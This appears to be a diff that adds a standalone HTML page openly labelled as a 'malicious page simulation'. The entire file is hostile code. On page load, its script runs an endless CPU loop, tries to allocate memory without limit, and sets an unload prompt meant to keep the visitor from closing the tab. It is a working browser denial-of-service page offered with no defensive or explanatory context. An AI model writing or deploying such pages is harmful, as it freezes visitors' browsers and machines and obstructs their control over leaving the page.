@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <style>
+    body { 
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: black;
+      color: red;
+      padding-top: 50px;
+    }
+    h1 { font-size: 24px; }
+    p { font-size: 18px; }
+  </style>
+</head>
+<body>
+  <h1>🚨 MALICIOUS PAGE SIMULATION 🚨</h1>
+  <p id="status">Preparing to overload browser...</p>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    statusEl.textContent = "Starting CPU overload...";
+
+    setTimeout(() => {
+      let i = 0;
+      while (true) {
+        i++;
+        if (i % 1e7 === 0) { 
+          statusEl.textContent = `CPU Overloaded (${i} ops)...`;
+        }
+      }
+    }, 100);
+
+    setTimeout(() => {
+      const memoryHog = [];
+      statusEl.textContent = "Allocating RAM...";
+      while (true) {
+        memoryHog.push(new Uint8Array(100 * 1024 * 1024));
+        statusEl.textContent = `Allocated ${memoryHog.length * 100}MB...`;
+      }
+    }, 200);
+
+    window.onbeforeunload = (e) => {
+      e.preventDefault();
+      return "This page is trying to crash your browser. Close anyway?";
+    };
+  </script>
+</body>
+</html>
